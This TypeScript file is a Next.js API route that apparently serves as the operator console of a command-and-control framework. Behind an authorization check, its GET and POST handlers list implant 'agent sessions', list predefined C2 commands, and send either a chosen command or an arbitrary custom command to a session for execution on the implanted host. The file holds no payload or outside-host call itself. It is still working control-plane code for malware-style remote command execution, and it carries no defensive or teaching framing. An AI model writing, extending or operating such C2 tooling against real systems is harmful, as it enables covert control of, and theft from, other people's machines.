import { NextResponse } from "next/server";
import { isAuthorized } from "@/lib/auth";
import { getAllCommands, executeC2Command, executeCustomCommand, listAgentSessions, getCommandsByCategory } from "@/lib/implant/commands";

export async function GET(request: Request) {
  if (!isAuthorized(request)) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const url = new URL(request.url);
  const action = url.searchParams.get("action");

  try {
    if (action === "commands") {
      const grouped = getCommandsByCategory();
      const all = getAllCommands();
      return NextResponse.json({ commands: all, grouped });
    }

    if (action === "sessions") {
      const sessions = await listAgentSessions();
      return NextResponse.json({ sessions });
    }

    if (action === "command") {
      const sessionId = Number(url.searchParams.get("sessionId"));
      const commandId = url.searchParams.get("commandId");
      const param = url.searchParams.get("param") || undefined;

      if (!sessionId || !commandId) {
        return NextResponse.json({ error: "sessionId and commandId required" }, { status: 400 });
      }

      const result = await executeC2Command(sessionId, commandId, param);
      return NextResponse.json(result);
    }

    if (action === "custom") {
      const sessionId = Number(url.searchParams.get("sessionId"));
      const command = url.searchParams.get("command");

      if (!sessionId || !command) {
        return NextResponse.json({ error: "sessionId and command required" }, { status: 400 });
      }

      const result = await executeCustomCommand(sessionId, command);
      return NextResponse.json(result);
    }

    return NextResponse.json({ error: "Unknown action" }, { status: 400 });
  } catch (error) {
    return NextResponse.json(
      { error: error instanceof Error ? error.message : "Failed to process request" },
      { status: 502 },
    );
  }
}

export async function POST(request: Request) {
  if (!isAuthorized(request)) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  try {
    const body = await request.json();
    const { action, sessionId, commandId, param, command } = body;

    if (action === "execute" && sessionId && commandId) {
      const result = await executeC2Command(sessionId, commandId, param);
      return NextResponse.json(result);
    }

    if (action === "custom" && sessionId && command) {
      const result = await executeCustomCommand(sessionId, command);
      return NextResponse.json(result);
    }

    return NextResponse.json({ error: "Invalid action" }, { status: 400 });
  } catch (error) {
    return NextResponse.json(
      { error: error instanceof Error ? error.message : "Failed to process request" },
      { status: 502 },
    );
  }
}
